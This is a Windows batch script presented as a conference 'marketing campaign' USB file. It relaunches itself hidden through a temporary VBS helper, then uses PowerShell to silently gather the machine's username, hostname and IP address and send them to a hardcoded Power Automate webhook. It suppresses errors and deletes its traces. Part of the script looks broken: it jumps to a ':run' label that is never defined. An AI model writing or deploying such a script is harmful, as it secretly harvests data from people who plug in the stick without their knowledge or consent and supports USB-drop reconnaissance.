@echo off
:: ============================================================
::  Conference USB - Marketing Campaign
::  Edit the 3 lines below, copy to USB, done.
:: ===========================================================
set USB_ID=USB-001
 
:: If not already running silently, relaunch self via VBS with no window
if "%1"=="silent" goto :run
echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\silent_usb.vbs"
echo WshShell.Run "cmd.exe /c ""%~f0"" silent", 0, False >> "%temp%\silent_usb.vbs"
start "" wscript.exe "%temp%\silent_usb.vbs"
exit /b
 
 
:: Silently collect and send data
powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command ^
  "$u=(whoami).Split('\')[-1];" ^
  "$h=[System.Net.Dns]::GetHostName();" ^
  "$ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127*' -and $_.IPAddress -notlike '169*'} | Select-Object -First 1).IPAddress;" ^
  "$t=[datetime]::UtcNow.ToString('o');" ^
  "$b='[{\"timestamp\":\"'+$t+'\",\"username\":\"'+$u+'\",\"hostname\":\"'+$h+'\",\"ip\":\"'+$ip+'\",\"usb_id\":\"%USB_ID%\"}]';" ^
  "try { Invoke-WebRequest -Uri 'https://default186f8545468f49e59c70379e23e2af.14.environment.api.powerplatform.com:443/powerautomate/automations/direct/cu/07/workflows/077b9dbc48f54a7a93fecc9619390597/triggers/manual/paths/invoke?api-version=1&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=DeE829DsviqXQivynKdiFqZOo2Hs05j5rYkZtUztfXA' -Method POST -Body $b -ContentType 'application/json' -UseBasicParsing } catch {}"
 
:: Cleanup temp vbs
del "%temp%\silent_usb.vbs" >nul 2>&1
 
 
